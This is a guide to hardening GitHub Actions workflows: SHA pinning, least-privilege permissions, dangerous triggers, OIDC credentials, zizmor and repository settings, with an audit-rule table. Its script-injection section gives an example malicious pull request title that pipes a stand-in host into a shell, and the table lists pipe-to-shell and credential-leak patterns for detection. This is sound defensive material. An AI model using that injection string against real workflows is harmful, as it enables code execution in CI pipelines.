# Hardening GitHub Actions

Contents:
- The rules the audit script checks
- Pin every action to a commit SHA
- Least-privilege permissions
- Triggers that run untrusted code
- Script injection
- Credentials: use OIDC
- zizmor
- Repository and organization settings
- Keeping pins current
- Sources

## The rules the audit script checks

`scripts/ci_audit.py` reports these ids for workflow files. Each finding names the line and the fix.

| Id | Finding |
|---|---|
| GHA001 | `uses:` not pinned to a 40-character commit SHA (error for third-party actions and reusable workflows, warning for `actions/` and `github/`); Docker actions without a digest |
| GHA002 | No `permissions:` block at the workflow level or on a job; `permissions: write-all` |
| GHA003 | `pull_request_target` trigger; a `pull_request_target` workflow that checks out the pull request's own code |
| GHA005 | Long-lived cloud credentials: `credentials_json`, service-account key secrets, `GOOGLE_APPLICATION_CREDENTIALS`, AWS and Azure secret keys |
| GHA006 | An attacker-controlled expression (`github.head_ref`, issue and pull request titles and bodies, commit messages, comment bodies) expanded inside `run:` |
| GHA007 | `secrets: inherit` |
| GHA008 | `actions/checkout` without `persist-credentials: false` |
| GHA013 | `ACTIONS_ALLOW_UNSECURE_COMMANDS` set to true |
| CI001, CI002, CI003 | Pipe-to-shell installs, `docker login -p`, private keys and cloud access keys written into the file |

The script is line-based. It misses anything that needs a real parse of the workflow graph;
zizmor covers that.

## Pin every action to a commit SHA

A tag or branch can be moved to different code. A full-length commit SHA cannot. GitHub's own
guidance is to pin actions to a full-length commit SHA, and in March 2026 the tags of a widely
used scanner action were force-pushed to credential-stealing code, which reached every
workflow that referenced a tag (https://snyk.io/de/articles/trivy-github-actions-supply-chain-compromise/).

Resolve a tag to the commit it points at (annotated tags need the second call):

```sh
gh api repos/OWNER/REPO/git/ref/tags/TAG --jq '[.object.type, .object.sha] | @tsv'
# when the type is "tag", dereference it:
gh api repos/OWNER/REPO/git/tags/SHA_FROM_ABOVE --jq .object.sha
```

Write the pin with the version in a comment so Dependabot and Renovate can update both:

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

Confirm the SHA belongs to the action's own repository and not a fork. Reusable workflows from
the organization can be pinned the same way.

## Least-privilege permissions

Start every workflow with `permissions: {}` and give each job only what it uses:

| Need | Permission |
|---|---|
| Check out the repository | `contents: read` |
| Keyless signing, or Workload Identity Federation | `id-token: write` |
| Push to GitHub Container Registry | `packages: write` |
| Build provenance with `actions/attest` | `attestations: write`, `artifact-metadata: write` (plus `id-token: write`) |
| Read workflow runs (zizmor on a private repository) | `actions: read` |

A job without its own `permissions:` block inherits the workflow's, and a workflow with none
inherits the repository default. Set the repository default to read-only as well (see settings
below).

## Triggers that run untrusted code

- Prefer `pull_request`. It runs with a read-only token and no secrets for pull requests from forks.
- `pull_request_target` and `workflow_run` run in the context of the base repository, with secrets
  and a write token available. Never check out or run a pull request's code in them. When a
  privileged step must follow untrusted work, split it: an unprivileged `pull_request` workflow
  uploads an artifact and a privileged `workflow_run` workflow reads only that artifact.
- Treat `issue_comment` and `issues` workflows like `pull_request_target`: the text is attacker-controlled.

## Script injection

`${{ ... }}` is expanded into the script text before the shell sees it, so a pull request titled
`"; curl evil | sh #` runs as code. Pass untrusted values through the environment:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

## Credentials: use OIDC

Replace any stored cloud key with `google-github-actions/auth` using
`workload_identity_provider` and, for an access token, `service_account` and
`token_format: access_token`. The job needs `id-token: write`. Pool, provider and attribute
condition setup is in `gcp-workload-identity.md`. The `google-github-actions/auth` documentation
states that an attribute condition restricting which repositories can use the pool is required for
security.

## zizmor

zizmor is a static analyzer for GitHub Actions (MIT licensed). Run it in the repository root:

```sh
uvx zizmor .                         # or: zizmor . after installing it from docs.zizmor.sh
zizmor --persona pedantic .          # adds code-smell findings
zizmor --format sarif . > zizmor.sarif
zizmor --gh-token "$(gh auth token)" .   # online mode adds checks that call the GitHub API
```

Exit code 0 means no findings; 11 to 14 mean findings of rising severity; 1 means an error
during the audit. Its audits include `unpinned-uses`, `excessive-permissions`,
`template-injection`, `dangerous-triggers`, `artipacked`, `cache-poisoning`,
`known-vulnerable-actions`, `secrets-inherit`, `github-env`, `impostor-commit` and
`unpinned-images`; fetch https://docs.zizmor.sh/audits/ for the current list. Suppress a finding
in `zizmor.yml` with a recorded reason, never silently.

## Repository and organization settings

These change shared state. Draft them and let a repository admin apply them.

- **Require actions to be pinned to a full-length commit SHA**: Settings > Actions > General >
  Actions permissions. Repository level; reusable workflows can still use tags.
- **Workflow permissions**: Settings > Actions > General > Workflow permissions, set to the
  restricted (read-only) default.
- **Fork pull request approval**: require approval for all external contributors.
- **Environments**: create `release` with required reviewers (up to six people or teams),
  prevent self-review, and limit deployment to `main` and release tags. Private repositories
  need GitHub Team or Pro for environments.
- **Branch protection or rulesets**: require a pull request, at least one approval, code owner
  review, passing status checks, and no force pushes on `main`. Rulesets are available on GitHub
  Team and Enterprise plans; check the plan before drafting.
- **CODEOWNERS** covering `.github/workflows/`, Dockerfiles and the dependency bot config, so a
  change to the pipeline needs a security reviewer. `templates/CODEOWNERS` is a starting point.

Read current state without changing it:

```sh
gh api repos/OWNER/REPO/actions/permissions
gh api repos/OWNER/REPO/actions/permissions/workflow
gh api repos/OWNER/REPO/rulesets
gh api repos/OWNER/REPO/environments
```

## Keeping pins current

Copy `templates/dependabot.yml` (groups action bumps and sets a seven-day `cooldown`) or
`templates/renovate.json` (`config:best-practices` pins GitHub Action digests and Docker
digests, and `minimumReleaseAge` delays new releases). Either one opens pull requests that move
the SHA and the version comment together. Review them like code.

Artifact attestations from `actions/attest` need a public repository or GitHub Enterprise Cloud;
on a private repository without that plan the reference pipeline skips the step and relies on
cosign. Keyless cosign records the signing identity, which includes the repository path, in
Sigstore's public transparency log; see `image-supply-chain/references/sign-and-attest.md`.

## Sources

Fetched 2026-10-16.

- GitHub, secure use of Actions: https://docs.github.com/en/actions/reference/security/secure-use
- GitHub, repository Actions settings: https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository
- GitHub, environments: https://docs.github.com/en/actions/how-tos/deploy/configure-and-manage-deployments/manage-environments
- GitHub, rulesets: https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets
- zizmor usage and audits: https://docs.zizmor.sh/usage/ and https://docs.zizmor.sh/audits/
- google-github-actions/auth: https://github.com/google-github-actions/auth
- Trivy action compromise write-up: https://snyk.io/de/articles/trivy-github-actions-supply-chain-compromise/
- Dependabot options (cooldown, groups): https://docs.github.com/en/code-security/dependabot/working-with-dependabot/dependabot-options-reference
- Renovate `config:best-practices`: https://docs.renovatebot.com/presets-config/
